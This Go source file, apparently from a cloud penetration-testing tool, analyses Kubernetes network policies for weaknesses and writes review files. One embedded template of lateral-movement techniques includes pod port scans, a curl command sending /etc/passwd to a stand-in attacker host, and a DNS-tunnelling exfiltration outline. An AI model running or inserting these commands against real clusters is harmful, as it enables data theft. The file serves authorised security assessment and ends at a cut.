package commands

import (
	"context"
	"fmt"
	"os"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	corev1 "k8s.io/api/core/v1"
	netv1 "k8s.io/api/networking/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/labels"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/tools/clientcmd"
)

var NetworkPoliciesCmd = &cobra.Command{
	Use:     "network-policy",
	Aliases: []string{"net-pol"},
	Short:   "List all cluster Network Policies with comprehensive security analysis",
	Long: `
List all cluster Network Policies with comprehensive security analysis including:
- Coverage gap identification (namespaces/pods without policies)
- Policy weakness detection (overly permissive rules)
- Lateral movement opportunity analysis
- Data exfiltration risk assessment
- Metadata API access detection
- Default-deny policy recommendations
- Risk-based scoring for prioritized security review
  cloudfox kubernetes network-policy`,
	Run: ListNetworkPolicies,
}

type NetworkPoliciesOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t NetworkPoliciesOutput) TableFiles() []internal.TableFile {
	return t.Table
}

func (t NetworkPoliciesOutput) LootFiles() []internal.LootFile {
	return t.Loot
}

// PolicyFinding represents a comprehensive network policy with security analysis
type PolicyFinding struct {
	// Basic info
	Namespace   string
	Name        string
	Type        string // "NetworkPolicy", "CalicoNetworkPolicy", etc.
	PodSelector string
	PolicyTypes []string

	// Coverage
	CoveredPods        int
	CoveredDeployments []string
	CoveredServices    []string
	AffectedNamespaces []string

	// Security analysis
	RiskLevel             string // CRITICAL/HIGH/MEDIUM/LOW
	SecurityIssues        []string
	Weaknesses            []string
	MisconfigurationTypes []string

	// Ingress analysis
	IngressRules          string
	IngressAllowsInternet bool
	IngressAllowsAllPods  bool
	IngressAllowsAllNS    bool
	IngressAllowsAllPorts bool
	IngressSources        []string
	IngressDangerousPorts []int32

	// Egress analysis
	EgressRules                 string
	EgressAllowsInternet        bool
	EgressAllowsAllDestinations bool
	EgressAllowsAllNS           bool
	EgressAllowsAllPorts        bool
	EgressDestinations          []string
	EgressAllowsDNS             bool
	EgressAllowsHTTPS           bool
	EgressAllowsMetadataAPI     bool
	EgressAllowsCloudAPIs       bool
	DataExfiltrationRisk        string // "CRITICAL", "HIGH", "MEDIUM", "LOW", "NONE"

	// Default-deny analysis
	IsDefaultDeny        bool
	DefaultDenyIngress   bool
	DefaultDenyEgress    bool
	RecommendDefaultDeny bool

	// Policy effectiveness
	IsEffective         bool
	HasNoEffect         bool // Policy that matches no pods
	ConflictingPolicies []string

	// Attack scenarios
	AllowsLateralMovement  bool
	AllowsDataExfiltration bool
	AllowsMetadataAccess   bool
	AllowsKubeAPIAccess    bool

	// Service correlation
	AffectedServices         []string
	HasInternetFacingService bool
}

// EgressRiskAnalysis contains egress security analysis
type EgressRiskAnalysis struct {
	PolicyName           string
	Namespace            string
	RiskLevel            string
	DataExfiltrationRisk string
	SecurityIssues       []string

	AllowsInternet        bool
	AllowsDNS             bool
	AllowsHTTPS           bool
	AllowsMetadataAPI     bool
	AllowsCloudAPIs       bool
	AllowsAllPorts        bool
	AllowsAllDestinations bool
	AllowsKubeAPI         bool
}

// DefaultDenyStatus tracks default-deny policy status per namespace
type DefaultDenyStatus struct {
	Namespace           string
	HasDefaultDeny      bool
	HasIngressDeny      bool
	HasEgressDeny       bool
	IngressDenyPolicies []string
	EgressDenyPolicies  []string
	Recommended         bool
	Recommendations     []string
}

// CoverageGap represents pods without network policy coverage
type CoverageGap struct {
	Namespace         string
	PodsWithoutPolicy []string
	RiskLevel         string
}

// WeaknessPattern defines a policy weakness detection pattern
type WeaknessPattern struct {
	Name        string
	Description string
	Severity    string
	Check       func(*netv1.NetworkPolicy) bool
}

// ServiceInfo contains service details for correlation
type ServiceInfo struct {
	Name           string
	Type           string
	Ports          []int32
	ExternalIPs    []string
	InternetFacing bool
}

// PolicyServiceCorrelation links policies to affected services
type PolicyServiceCorrelation struct {
	PolicyName               string
	Namespace                string
	AffectedServices         []ServiceInfo
	HasInternetFacingService bool
	RiskLevel                string
	SecurityIssue            string
}

// Dangerous ports database (reused from network-exposure)
var networkPolicyDangerousPorts = map[int32]string{
	22:    "SSH",
	23:    "Telnet",
	3389:  "RDP",
	3306:  "MySQL",
	5432:  "PostgreSQL",
	27017: "MongoDB",
	6379:  "Redis",
	9200:  "Elasticsearch",
	6443:  "Kubernetes API",
	10250: "Kubelet API",
	2379:  "etcd",
}

// Policy weakness patterns
var policyWeaknessPatterns = []WeaknessPattern{
	{
		Name:        "Unrestricted Ingress",
		Description: "Policy allows ingress from all sources",
		Severity:    "HIGH",
		Check: func(np *netv1.NetworkPolicy) bool {
			for _, rule := range np.Spec.Ingress {
				if len(rule.From) == 0 {
					return true
				}
			}
			return false
		},
	},
	{
		Name:        "Internet Ingress",
		Description: "Policy allows ingress from internet (0.0.0.0/0)",
		Severity:    "CRITICAL",
		Check: func(np *netv1.NetworkPolicy) bool {
			for _, rule := range np.Spec.Ingress {
				for _, from := range rule.From {
					if from.IPBlock != nil && (from.IPBlock.CIDR == "0.0.0.0/0" || from.IPBlock.CIDR == "::/0") {
						return true
					}
				}
			}
			return false
		},
	},
	{
		Name:        "Cross-Namespace Access",
		Description: "Policy allows ingress from all namespaces",
		Severity:    "MEDIUM",
		Check: func(np *netv1.NetworkPolicy) bool {
			for _, rule := range np.Spec.Ingress {
				for _, from := range rule.From {
					if from.NamespaceSelector != nil && len(from.NamespaceSelector.MatchLabels) == 0 {
						return true
					}
				}
			}
			return false
		},
	},
	{
		Name:        "Unrestricted Egress",
		Description: "Policy allows egress to all destinations",
		Severity:    "HIGH",
		Check: func(np *netv1.NetworkPolicy) bool {
			for _, rule := range np.Spec.Egress {
				if len(rule.To) == 0 {
					return true
				}
			}
			return false
		},
	},
	{
		Name:        "Metadata API Access",
		Description: "Policy allows access to cloud metadata API",
		Severity:    "HIGH",
		Check: func(np *netv1.NetworkPolicy) bool {
			for _, rule := range np.Spec.Egress {
				for _, to := range rule.To {
					if to.IPBlock != nil && strings.HasPrefix(to.IPBlock.CIDR, "169.254.") {
						return true
					}
				}
			}
			return false
		},
	},
	{
		Name:        "Dangerous Port Ingress",
		Description: "Policy allows ingress to dangerous ports (SSH, RDP, databases)",
		Severity:    "HIGH",
		Check: func(np *netv1.NetworkPolicy) bool {
			for _, rule := range np.Spec.Ingress {
				for _, port := range rule.Ports {
					if port.Port != nil {
						if _, isDangerous := networkPolicyDangerousPorts[port.Port.IntVal]; isDangerous {
							return true
						}
					}
				}
			}
			return false
		},
	},
	{
		Name:        "All Ports Allowed",
		Description: "Policy allows all ports (no port restrictions)",
		Severity:    "MEDIUM",
		Check: func(np *netv1.NetworkPolicy) bool {
			for _, rule := range np.Spec.Ingress {
				if len(rule.Ports) == 0 && len(rule.From) > 0 {
					return true
				}
			}
			for _, rule := range np.Spec.Egress {
				if len(rule.Ports) == 0 && len(rule.To) > 0 {
					return true
				}
			}
			return false
		},
	},
	{
		Name:        "DNS Exfiltration Risk",
		Description: "Policy allows unrestricted DNS egress (data exfiltration risk)",
		Severity:    "MEDIUM",
		Check: func(np *netv1.NetworkPolicy) bool {
			for _, rule := range np.Spec.Egress {
				for _, port := range rule.Ports {
					if port.Port != nil && port.Port.IntVal == 53 {
						if len(rule.To) == 0 {
							return true
						}
					}
				}
			}
			return false
		},
	},
	{
		Name:        "No Policy Types Specified",
		Description: "Policy doesn't specify PolicyTypes (may not take effect)",
		Severity:    "MEDIUM",
		Check: func(np *netv1.NetworkPolicy) bool {
			return len(np.Spec.PolicyTypes) == 0
		},
	},
	{
		Name:        "Empty Selector with Permissive Rules",
		Description: "Policy matches all pods but has overly permissive rules",
		Severity:    "HIGH",
		Check: func(np *netv1.NetworkPolicy) bool {
			if !isEmptySelector(&np.Spec.PodSelector) {
				return false
			}
			// Check for permissive ingress
			for _, rule := range np.Spec.Ingress {
				if len(rule.From) == 0 {
					return true
				}
			}
			// Check for permissive egress
			for _, rule := range np.Spec.Egress {
				if len(rule.To) == 0 {
					return true
				}
			}
			return false
		},
	},
}

func buildDynamicClient() dynamic.Interface {
	restConfig, err := clientcmd.RESTConfigFromKubeConfig(globals.RawKubeconfig)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to load kubeconfig for dynamic client: %v\n", err)
		os.Exit(1)
	}

	dynClient, err := dynamic.NewForConfig(restConfig)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to create dynamic client: %v\n", err)
		os.Exit(1)
	}
	return dynClient
}

func ListNetworkPolicies(cmd *cobra.Command, args []string) {
	ctx := context.Background()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating network policies with comprehensive security analysis for %s", globals.ClusterName), globals.K8S_NETWORK_POLICY_MODULE_NAME)

	clientset := config.GetClientOrExit()
	dyn := buildDynamicClient()

	namespaces, err := clientset.CoreV1().Namespaces().List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing namespaces: %v", err), globals.K8S_NETWORK_POLICY_MODULE_NAME)
		return
	}

	// Get all pods for coverage analysis
	allPods := make(map[string][]corev1.Pod) // namespace -> pods
	for _, ns := range namespaces.Items {
		pods, err := clientset.CoreV1().Pods(ns.Name).List(ctx, metav1.ListOptions{})
		if err == nil {
			allPods[ns.Name] = pods.Items
		}
	}

	// Get all services for correlation
	allServices := make(map[string][]corev1.Service) // namespace -> services
	for _, ns := range namespaces.Items {
		services, err := clientset.CoreV1().Services(ns.Name).List(ctx, metav1.ListOptions{})
		if err == nil {
			allServices[ns.Name] = services.Items
		}
	}

	headers := []string{
		"Risk", "Namespace", "Name", "Type", "Covered Pods",
		"Internet Ingress", "Internet Egress", "Metadata API", "Data Exfil Risk",
		"Default-Deny", "Allows All NS", "Dangerous Ports",
		"Affected Services", "Lateral Movement", "DNS Egress", "Cloud API Access",
		"Security Issues", "Weaknesses",
	}
	var outputRows [][]string
	var findings []PolicyFinding

	// Risk level counters
	riskCounts := map[string]int{
		"CRITICAL": 0,
		"HIGH":     0,
		"MEDIUM":   0,
		"LOW":      0,
	}

	namespaceMap := make(map[string][]string)
	namespacePolicies := make(map[string][]PolicyFinding)      // Track policies per namespace
	namespaceDefaultDeny := make(map[string]DefaultDenyStatus) // Track default-deny per namespace

	// Loot sections
	var lootWeaknesses []string
	var lootCoverageGaps []string
	var lootLateralMovement []string
	var lootDataExfiltration []string
	var lootMetadataAPI []string
	var lootDefaultDeny []string
	var lootInternetExposure []string
	var lootDangerousPorts []string

	// Initialize loot files
	lootWeaknesses = append(lootWeaknesses, `#####################################
##### Network Policy Weaknesses
#####################################
#
# MANUAL REVIEW REQUIRED
# Network policies with overly permissive rules
# that could enable lateral movement or data exfiltration
#
`)

	lootCoverageGaps = append(lootCoverageGaps, `#####################################
##### Network Policy Coverage Gaps
#####################################
#
# CRITICAL SECURITY ISSUE
# Namespaces and pods WITHOUT network policies
# These are completely open for lateral movement
#
`)

	lootLateralMovement = append(lootLateralMovement, `#####################################
##### Lateral Movement Opportunities
#####################################
#
# MANUAL EXPLOITATION REQUIRED
# Techniques to exploit network policy gaps
# for lateral movement within the cluster
#
`)

	lootDataExfiltration = append(lootDataExfiltration, `#####################################
##### Data Exfiltration Risks
#####################################
#
# CRITICAL - EGRESS POLICY ANALYSIS
# Policies allowing data exfiltration via egress rules
# Focus on DNS tunneling, HTTPS exfil, and unrestricted egress
#
`)

	lootMetadataAPI = append(lootMetadataAPI, `#####################################
##### Cloud Metadata API Access
#####################################
#
# HIGH RISK - CREDENTIAL THEFT
# Policies allowing access to cloud metadata APIs
# AWS: 169.254.169.254, GCP: metadata.google.internal
#
`)

	lootDefaultDeny = append(lootDefaultDeny, `#####################################
##### Default-Deny Policy Recommendations
#####################################
#
# SECURITY BEST PRACTICE
# Namespaces missing default-deny policies
# Templates included for easy implementation
#
`)

	lootInternetExposure = append(lootInternetExposure, `#####################################
##### Internet-Facing Policy Exposures
#####################################
#
# CRITICAL ATTACK SURFACE
# Policies allowing ingress from internet (0.0.0.0/0)
#
`)

	lootDangerousPorts = append(lootDangerousPorts, `#####################################
##### Dangerous Port Exposures
#####################################
#
# HIGH RISK - ADMIN ACCESS
# Policies exposing SSH, RDP, databases, and K8s APIs
#
`)

	// --- Standard Kubernetes NetworkPolicies ---
	for _, ns := range namespaces.Items {
		nps, err := clientset.NetworkingV1().NetworkPolicies(ns.Name).List(ctx, metav1.ListOptions{})
		if err == nil {
			for _, np := range nps.Items {
				finding := analyzeNetworkPolicy(ctx, clientset, &np, allPods[ns.Name], allServices[ns.Name])
				findings = append(findings, finding)
				namespacePolicies[ns.Name] = append(namespacePolicies[ns.Name], finding)
				riskCounts[finding.RiskLevel]++

				// Build table row
				row := buildTableRow(finding)
				outputRows = append(outputRows, row)

				namespaceMap[np.Namespace] = append(namespaceMap[np.Namespace],
					fmt.Sprintf("kubectl get networkpolicy %q -n %q -o yaml", np.Name, np.Namespace))

				// Generate loot entries
				generateLootEntries(&finding, &lootWeaknesses, &lootDataExfiltration,
					&lootMetadataAPI, &lootInternetExposure, &lootDangerousPorts)
			}
		}
	}

	// --- Analyze default-deny status per namespace ---
	for _, ns := range namespaces.Items {
		defaultDenyStatus := analyzeDefaultDenyPolicies(ctx, clientset, ns.Name)
		namespaceDefaultDeny[ns.Name] = defaultDenyStatus

		if defaultDenyStatus.Recommended {
			lootDefaultDeny = append(lootDefaultDeny, fmt.Sprintf("\n### [HIGH] Namespace Missing Default-Deny: %s", ns.Name))
			if !defaultDenyStatus.HasIngressDeny {
				lootDefaultDeny = append(lootDefaultDeny, "# Missing default-deny INGRESS policy")
			}
			if !defaultDenyStatus.HasEgressDeny {
				lootDefaultDeny = append(lootDefaultDeny, "# Missing default-deny EGRESS policy")
			}
			lootDefaultDeny = append(lootDefaultDeny, "")
			lootDefaultDeny = append(lootDefaultDeny, "# Recommended policy:")
			lootDefaultDeny = append(lootDefaultDeny, generateDefaultDenyTemplate(ns.Name, defaultDenyStatus))
			lootDefaultDeny = append(lootDefaultDeny, "")
		}
	}

	// --- CNI CRDs ---
	crds := []struct {
		GVR       schema.GroupVersionResource
		Kind      string
		Namespace bool
	}{
		{
			GVR:  schema.GroupVersionResource{Group: "networking.projectcalico.org", Version: "v3", Resource: "networkpolicies"},
			Kind: "CalicoNetworkPolicy", Namespace: true,
		},
		{
			GVR:  schema.GroupVersionResource{Group: "cilium.io", Version: "v2", Resource: "ciliumnetworkpolicies"},
			Kind: "CiliumNetworkPolicy", Namespace: true,
		},
		{
			GVR:  schema.GroupVersionResource{Group: "cilium.io", Version: "v2", Resource: "ciliumclusterwidenetworkpolicies"},
			Kind: "CiliumClusterwideNetworkPolicy", Namespace: false,
		},
		{
			GVR:  schema.GroupVersionResource{Group: "crd.antrea.io", Version: "v1beta1", Resource: "networkpolicies"},
			Kind: "AntreaNetworkPolicy", Namespace: true,
		},
		{
			GVR:  schema.GroupVersionResource{Group: "crd.antrea.io", Version: "v1beta1", Resource: "clusternetworkpolicies"},
			Kind: "AntreaClusterNetworkPolicy", Namespace: false,
		},
	}

	for _, crd := range crds {
		if crd.Namespace {
			for _, ns := range namespaces.Items {
				res, err := dyn.Resource(crd.GVR).Namespace(ns.Name).List(ctx, metav1.ListOptions{})
				if err != nil {
					continue
				}
				for _, item := range res.Items {
					finding := analyzeCNIPolicy(item.Object, crd.Kind, ns.Name)
					findings = append(findings, finding)
					namespacePolicies[ns.Name] = append(namespacePolicies[ns.Name], finding)
					riskCounts[finding.RiskLevel]++

					row := buildTableRow(finding)
					outputRows = append(outputRows, row)

					namespaceMap[ns.Name] = append(namespaceMap[ns.Name],
						fmt.Sprintf("kubectl get %s %q -n %q -o yaml", strings.ToLower(crd.Kind), item.GetName(), ns.Name))
				}
			}
		} else {
			res, err := dyn.Resource(crd.GVR).List(ctx, metav1.ListOptions{})
			if err != nil {
				continue
			}
			for _, item := range res.Items {
				finding := analyzeCNIPolicy(item.Object, crd.Kind, "<CLUSTER>")
				findings = append(findings, finding)
				riskCounts[finding.RiskLevel]++

				row := buildTableRow(finding)
				outputRows = append(outputRows, row)

				namespaceMap["CLUSTER"] = append(namespaceMap["CLUSTER"],
					fmt.Sprintf("kubectl get %s %q -o yaml", strings.ToLower(crd.Kind), item.GetName()))
			}
		}
	}

	// --- Coverage Gap Analysis ---
	var coverageGaps []CoverageGap
	for _, ns := range namespaces.Items {
		// Skip system namespaces for cleaner output
		if ns.Name == "kube-system" || ns.Name == "kube-public" || ns.Name == "kube-node-lease" {
			continue
		}

		pods := allPods[ns.Name]
		if len(pods) == 0 {
			continue
		}

		policies := namespacePolicies[ns.Name]

		// If no policies exist in namespace, all pods are uncovered
		if len(policies) == 0 {
			var podNames []string
			for _, pod := range pods {
				podNames = append(podNames, pod.Name)
			}
			gap := CoverageGap{
				Namespace:         ns.Name,
				PodsWithoutPolicy: podNames,
				RiskLevel:         "CRITICAL",
			}
			coverageGaps = append(coverageGaps, gap)
			riskCounts["CRITICAL"]++

			generateCoverageGapLoot(gap, &lootCoverageGaps, &lootLateralMovement)
			continue
		}

		// Check for pods not covered by any policy
		var uncoveredPods []string
		for _, pod := range pods {
			covered := isPodCoveredByPolicies(&pod, policies)
			if !covered {
				uncoveredPods = append(uncoveredPods, pod.Name)
			}
		}

		if len(uncoveredPods) > 0 {
			gap := CoverageGap{
				Namespace:         ns.Name,
				PodsWithoutPolicy: uncoveredPods,
				RiskLevel:         "HIGH",
			}
			coverageGaps = append(coverageGaps, gap)
			riskCounts["HIGH"]++

			lootCoverageGaps = append(lootCoverageGaps, fmt.Sprintf("\n### [HIGH] Partial Coverage: %s", ns.Name))
			lootCoverageGaps = append(lootCoverageGaps, fmt.Sprintf("# %d pods not covered by any network policy", len(uncoveredPods)))
			lootCoverageGaps = append(lootCoverageGaps, "# Uncovered pods:")
			for _, podName := range uncoveredPods {
				lootCoverageGaps = append(lootCoverageGaps, fmt.Sprintf("#   - %s", podName))
			}
			lootCoverageGaps = append(lootCoverageGaps, "")
		}
	}

	// Add lateral movement techniques
	lootLateralMovement = append(lootLateralMovement, `
### General Lateral Movement Techniques

# Once you have access to a pod, use these techniques to explore the network:

# 1. Discover services in the same namespace
kubectl get svc -n <namespace>
nslookup <service-name>.<namespace>.svc.cluster.local

# 2. Discover services in other namespaces
kubectl get svc --all-namespaces
nslookup <service-name>.<namespace>.svc.cluster.local

# 3. Port scan pods in the same namespace
for ip in $(kubectl get pods -n <namespace> -o jsonpath='{.items[*].status.podIP}'); do
  nmap -p 22,80,443,3306,5432,6379,27017,8080,9200 $ip
done

# 4. Test connectivity to Kubernetes API from pod
curl -k https://kubernetes.default.svc.cluster.local/api

# 5. Test external egress (if no egress policies)
curl https://evil.attacker.com/exfiltrate -d @/etc/passwd

# 6. Common database ports to test
# MySQL: 3306, PostgreSQL: 5432, MongoDB: 27017
# Redis: 6379, Elasticsearch: 9200

# 7. DNS tunneling for data exfiltration
# If DNS egress is allowed but HTTPS is blocked:
# Encode data in DNS queries: <base64-data>.attacker.com
`)

	// Finalize loot files with summaries
	finalizeLootFiles(&lootCoverageGaps, &lootLateralMovement, &lootDataExfiltration,
		&lootMetadataAPI, &lootDefaultDeny, coverageGaps, len(findings))

	// Build loot enum
	lootEnum := []string{
		"#####################################",
		"##### Enumerate Network Policy Information",
		"#####################################",
		"",
	}
	if globals.KubeContext != "" {
		lootEnum = append(lootEnum, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	namespacesList := make([]string, 0, len(namespaceMap))
	for ns := range namespaceMap {
		namespacesList = append(namespacesList, ns)
	}
	sort.Strings(namespacesList)

	for i, ns := range namespacesList {
		lootEnum = append(lootEnum, fmt.Sprintf("\n# Namespace: %s\n", ns))
		lootEnum = append(lootEnum, namespaceMap[ns]...)
		if i < len(namespacesList)-1 {
			lootEnum = append(lootEnum, "")
		}
	}

	table := internal.TableFile{
		Name:   "Network-Policies",
		Header: headers,
		Body:   outputRows,
	}

	lootFiles := []internal.LootFile{
		{Name: "Network-Policy-Enum", Contents: strings.Join(lootEnum, "\n")},
		{Name: "Network-Policy-Weaknesses", Contents: strings.Join(lootWeaknesses, "\n")},
		{Name: "Network-Policy-Coverage-Gaps", Contents: strings.Join(lootCoverageGaps, "\n")},
		{Name: "Network-Policy-Lateral-Movement", Contents: strings.Join(lootLateralMovement, "\n")},
		{Name: "Network-Policy-Data-Exfiltration", Contents: strings.Join(lootDataExfiltration, "\n")},
		{Name: "Network-Policy-Metadata-API-Access", Contents: strings.Join(lootMetadataAPI, "\n")},
		{Name: "Network-Policy-Default-Deny-Recommendations", Contents: strings.Join(lootDefaultDeny, "\n")},
		{Name: "Network-Policy-Internet-Exposure", Contents: strings.Join(lootInternetExposure, "\n")},
		{Name: "Network-Policy-Dangerous-Ports", Contents: strings.Join(lootDangerousPorts, "\n")},
	}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Network-Policies",
		globals.ClusterName,
		"results",
		NetworkPoliciesOutput{
			Table: []internal.TableFile{table},
			Loot:  lootFiles,
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_NETWORK_POLICY_MODULE_NAME)
		return
	}

	if len(outputRows) > 0 || len(coverageGaps) > 0 {
		logger.InfoM(fmt.Sprintf("%d policies found, %d coverage gaps detected | Risk: CRITICAL=%d, HIGH=%d, MEDIUM=%d, LOW=%d",
			len(outputRows), len(coverageGaps),
			riskCounts["CRITICAL"], riskCounts["HIGH"], riskCounts["MEDIUM"], riskCounts["LOW"]),
			globals.K8S_NETWORK_POLICY_MODULE_NAME)
	} else {
		logger.InfoM("No network policies found, skipping output file creation", globals.K8S_NETWORK_POLICY_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_NETWORK_POLICY_MODULE_NAME), globals.K8S_NETWORK_POLICY_MODULE_NAME)
}

// ====================
// Analysis Functions
// ====================

func analyzeNetworkPolicy(ctx context.Context, clientset *kubernetes.Clientset, np *netv1.NetworkPolicy,
	namespacePods []corev1.Pod, namespaceServices []corev1.Service) PolicyFinding {

	finding := PolicyFinding{
		Namespace:   np.Namespace,
		Name:        np.Name,
		Type:        "NetworkPolicy",
		PodSelector: formatLabelSelector(&np.Spec.PodSelector),
		PolicyTypes: make([]string, len(np.Spec.PolicyTypes)),
	}

	for i, pt := range np.Spec.PolicyTypes {
		finding.PolicyTypes[i] = string(pt)
	}

	finding.IngressRules = formatIngressRules(np.Spec.Ingress)
	finding.EgressRules = formatEgressRules(np.Spec.Egress)

	// Calculate covered pods
	finding.CoveredPods = calculateCoveredPods(np, namespacePods)

	// Check if policy has no effect
	if finding.CoveredPods == 0 {
		finding.HasNoEffect = true
		finding.IsEffective = false
		finding.SecurityIssues = append(finding.SecurityIssues, "Policy matches no pods (ineffective)")
	} else {
		finding.IsEffective = true
	}

	// Correlate with services
	finding.AffectedServices = correlateWithServices(np, namespaceServices)
	finding.HasInternetFacingService = hasInternetFacingServices(namespaceServices, finding.AffectedServices)

	// Analyze ingress rules
	finding = analyzeIngressRules(np, finding)

	// Analyze egress rules and data exfiltration risks
	egressRisk := analyzeEgressRisks(np)
	finding.EgressAllowsInternet = egressRisk.AllowsInternet
	finding.EgressAllowsAllDestinations = egressRisk.AllowsAllDestinations
	finding.EgressAllowsDNS = egressRisk.AllowsDNS
	finding.EgressAllowsHTTPS = egressRisk.AllowsHTTPS
	finding.EgressAllowsMetadataAPI = egressRisk.AllowsMetadataAPI
	finding.EgressAllowsCloudAPIs = egressRisk.AllowsCloudAPIs
	finding.DataExfiltrationRisk = egressRisk.DataExfiltrationRisk
	finding.SecurityIssues = append(finding.SecurityIssues, egressRisk.SecurityIssues...)

	// Check for default-deny pattern
	finding.IsDefaultDeny = isNetworkPolicyDefaultDeny(np)
	if finding.IsDefaultDeny {
		for _, pt := range np.Spec.PolicyTypes {
			if pt == netv1.PolicyTypeIngress && len(np.Spec.Ingress) == 0 {
				finding.DefaultDenyIngress = true
			}
			if pt == netv1.PolicyTypeEgress && len(np.Spec.Egress) == 0 {
				finding.DefaultDenyEgress = true
			}
		}
	}

	// Run weakness pattern checks
	for _, pattern := range policyWeaknessPatterns {
		if pattern.Check(np) {
			finding.Weaknesses = append(finding.Weaknesses, pattern.Name)
			finding.SecurityIssues = append(finding.SecurityIssues,
				fmt.Sprintf("[%s] %s", pattern.Severity, pattern.Description))
			finding.MisconfigurationTypes = append(finding.MisconfigurationTypes, pattern.Name)
		}
	}

	// Determine attack scenarios
	finding.AllowsLateralMovement = finding.IngressAllowsAllPods || finding.IngressAllowsAllNS || !finding.IsEffective
	finding.AllowsDataExfiltration = finding.EgressAllowsInternet || finding.DataExfiltrationRisk == "CRITICAL" || finding.DataExfiltrationRisk == "HIGH"
	finding.AllowsMetadataAccess = finding.EgressAllowsMetadataAPI
	finding.AllowsKubeAPIAccess = checkKubeAPIAccess(np)

	// Calculate comprehensive risk level
	finding.RiskLevel = calculatePolicyRiskLevel(finding, egressRisk)

	return finding
}

func analyzeIngressRules(np *netv1.NetworkPolicy, finding PolicyFinding) PolicyFinding {
	for _, rule := range np.Spec.Ingress {
		// Empty from[] allows all sources
		if len(rule.From) == 0 {
			finding.IngressAllowsAllPods = true
			finding.SecurityIssues = append(finding.SecurityIssues, "Ingress allows all sources (no restrictions)")
		}

		for _, from := range rule.From {
			// Check for 0.0.0.0/0
			if from.IPBlock != nil && (from.IPBlock.CIDR == "0.0.0.0/0" || from.IPBlock.CIDR == "::/0") {
				finding.IngressAllowsInternet = true
			}

			// Check for empty namespace selector (all namespaces)
			if from.NamespaceSelector != nil && len(from.NamespaceSelector.MatchLabels) == 0 {
				finding.IngressAllowsAllNS = true
			}
		}

		// Check for dangerous ports
		for _, port := range rule.Ports {
			if port.Port != nil {
				if _, isDangerous := networkPolicyDangerousPorts[port.Port.IntVal]; isDangerous {
					finding.IngressDangerousPorts = append(finding.IngressDangerousPorts, port.Port.IntVal)
				}
			}
		}

		// Empty ports[] allows all ports
		if len(rule.Ports) == 0 && len(rule.From) > 0 {
			finding.IngressAllowsAllPorts = true
		}
	}

	return finding
}

func analyzeEgressRisks(np *netv1.NetworkPolicy) EgressRiskAnalysis {
	risks := EgressRiskAnalysis{
		PolicyName:           np.Name,
		Namespace:            np.Namespace,
		RiskLevel:            "LOW",
		DataExfiltrationRisk: "NONE",
	}

	for _, rule := range np.Spec.Egress {
		// Check for unrestricted egress (allows all destinations)
		if len(rule.To) == 0 {
			risks.SecurityIssues = append(risks.SecurityIssues,
				"Unrestricted egress - allows all destinations")
			risks.AllowsInternet = true
			risks.AllowsAllDestinations = true
			risks.DataExfiltrationRisk = "CRITICAL"
			risks.RiskLevel = "CRITICAL"
		}

		for _, to := range rule.To {
			// Check for internet access (0.0.0.0/0)
			if to.IPBlock != nil && (to.IPBlock.CIDR == "0.0.0.0/0" || to.IPBlock.CIDR == "::/0") {
				risks.AllowsInternet = true
				risks.RiskLevel = "HIGH"

				if len(to.IPBlock.Except) > 0 {
					risks.SecurityIssues = append(risks.SecurityIssues,
						fmt.Sprintf("Internet access allowed except: %v", to.IPBlock.Except))
				} else {
					risks.SecurityIssues = append(risks.SecurityIssues,
						"Full internet access allowed (0.0.0.0/0)")
					risks.DataExfiltrationRisk = "HIGH"
				}
			}

			// Check for AWS metadata API (169.254.169.254)
			if to.IPBlock != nil &&
				(to.IPBlock.CIDR == "169.254.169.254/32" ||
					strings.HasPrefix(to.IPBlock.CIDR, "169.254.")) {
				risks.AllowsMetadataAPI = true
				risks.SecurityIssues = append(risks.SecurityIssues,
					"Allows AWS metadata API access (169.254.169.254) - credential theft risk")
				risks.RiskLevel = "HIGH"
				risks.DataExfiltrationRisk = "HIGH"
			}
		}

		// Check for specific ports
		for _, port := range rule.Ports {
			if port.Port != nil {
				switch port.Port.IntVal {
				case 53:
					risks.AllowsDNS = true
				case 443:
					risks.AllowsHTTPS = true
				case 6443:
					risks.AllowsKubeAPI = true
					risks.SecurityIssues = append(risks.SecurityIssues,
						"Allows egress to Kubernetes API (6443)")
				}
			}
		}

		// Check for unrestricted ports
		if len(rule.Ports) == 0 && len(rule.To) > 0 {
			risks.AllowsAllPorts = true
		}
	}

	// DNS + HTTPS + (internet or unrestricted) = cloud API access potential
	if risks.AllowsDNS && risks.AllowsHTTPS &&
		(risks.AllowsInternet || risks.AllowsAllDestinations) {
		risks.AllowsCloudAPIs = true
		risks.SecurityIssues = append(risks.SecurityIssues,
			"DNS + HTTPS egress enables AWS/GCP/Azure API access and data exfiltration")
		if risks.DataExfiltrationRisk == "NONE" {
			risks.DataExfiltrationRisk = "HIGH"
		}
	}

	// DNS + unrestricted = DNS tunneling risk
	if risks.AllowsDNS && (risks.AllowsInternet || risks.AllowsAllDestinations) {
		risks.SecurityIssues = append(risks.SecurityIssues,
			"Unrestricted DNS egress enables DNS tunneling for data exfiltration")
		if risks.DataExfiltrationRisk == "NONE" || risks.DataExfiltrationRisk == "LOW" {
			risks.DataExfiltrationRisk = "MEDIUM"
		}
	}

